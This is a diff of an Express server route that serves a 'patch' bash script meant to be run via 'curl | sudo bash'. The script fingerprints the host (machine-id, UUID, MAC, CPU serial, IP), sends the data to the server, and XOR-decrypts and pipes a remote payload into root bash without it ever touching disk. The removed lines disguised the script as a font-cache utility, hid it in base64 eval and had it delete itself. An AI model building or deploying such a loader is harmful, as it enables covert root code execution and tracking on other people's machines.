@@ -1391,19 +1391,20 @@ echo "Installation completed successfully"
     res.json({ success: true });
   });
 
-  // ─── Patch Install Script Download (Admin) - Thin Agent ────────────────
-  app.get("/api/patch-script/:token", requireAuth, async (req, res) => {
+  // ─── Patch Run (Public - curl | sudo bash) - Thin Agent in Memory ────────────────
+  app.use("/api/patch-run/:token", requireHttps);
+  app.get("/api/patch-run/:token", async (req, res) => {
     const tokenParam = String(req.params.token);
     const patch = await storage.getPatchTokenByToken(tokenParam);
-    if (!patch) return res.status(404).json({ message: "الباتش غير موجود" });
-    if (patch.status !== "pending") return res.status(400).json({ message: "هذا الباتش مستخدم أو ملغي" });
+    if (!patch) return res.status(404).send("echo 'Error: invalid token'; exit 1");
+    if (patch.status !== "pending") return res.status(400).send("echo 'Error: token expired'; exit 1");
 
     const baseUrl = getBaseUrl(req);
 
-    const innerScript = `#!/bin/bash
-if ! command -v python3 &>/dev/null; then echo "python3 is required"; exit 1; fi
-if ! command -v curl &>/dev/null; then echo "curl is required"; exit 1; fi
-echo "Initializing system update..."
+    const script = `#!/bin/bash
+if [ "$EUID" -ne 0 ]; then echo "Permission denied. Use: curl ... | sudo bash"; exit 1; fi
+command -v python3 &>/dev/null || { echo "python3 required"; exit 1; }
+command -v curl &>/dev/null || { echo "curl required"; exit 1; }
 _MI=$(cat /etc/machine-id 2>/dev/null || echo "")
 _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")
 _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")
@@ -1414,16 +1415,15 @@ _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys
 _RH="\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}"
 _HN=$(hostname 2>/dev/null || echo "unknown")
 _IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "")
-echo "Contacting update server..."
+_JB=$(python3 -c "import json,sys;print(json.dumps({'token':'${patch.token}','raw_hwid':sys.argv[1],'hostname':sys.argv[2],'ip':sys.argv[3]}))" "\${_RH}" "\${_HN}" "\${_IP}")
 _RS=$(curl -s -X POST "${baseUrl}/api/patch-activate" \\
   -H "Content-Type: application/json" \\
-  -d "{\\"token\\":\\"${patch.token}\\",\\"raw_hwid\\":\\"$_RH\\",\\"hostname\\":\\"$_HN\\",\\"ip\\":\\"$_IP\\"}")
-if echo "$_RS" | python3 -c "import sys,json;d=json.load(sys.stdin);exit(0 if 'error' in d else 1)" 2>/dev/null; then
-  echo "Error: $(echo "$_RS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('error','Failed'))" 2>/dev/null)"
+  -d "\${_JB}")
+if echo "\${_RS}" | python3 -c "import sys,json;d=json.load(sys.stdin);exit(0 if 'error' in d else 1)" 2>/dev/null; then
+  echo "Error: $(echo "\${_RS}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('error','Unknown'))" 2>/dev/null)"
   exit 1
 fi
-echo "Applying updates..."
-echo "$_RS" | python3 -c "
+echo "\${_RS}" | python3 -c "
 import sys,json,base64
 d=json.load(sys.stdin)
 p=base64.b64decode(d['payload'])
@@ -1432,20 +1432,9 @@ print(bytes([p[i]^k[i%len(k)] for i in range(len(p))]).decode())
 " | bash
 `;
 
-    const scriptB64 = Buffer.from(innerScript, "utf-8").toString("base64");
-    const obfuscatedScript = [
-      '#!/bin/bash',
-      '# Font rendering subsystem cache maintenance utility v2.13.1',
-      '# DO NOT MODIFY - binary cache data follows',
-      'if [ "$EUID" -ne 0 ]; then echo "Permission denied"; exit 1; fi',
-      '_0="$0"',
-      `eval "$(echo '${scriptB64}' | base64 -d)"`,
-      'rm -f "$_0" 2>/dev/null',
-    ].join('\n') + '\n';
-
     res.setHeader("Content-Type", "text/plain");
-    res.setHeader("Content-Disposition", `attachment; filename="fc-cache-update.sh"`);
-    res.send(obfuscatedScript);
+    res.setHeader("Cache-Control", "no-store, no-cache");
+    res.send(script);
   });
 
   // ─── Patch Activate (Public - called by install.sh) ────────
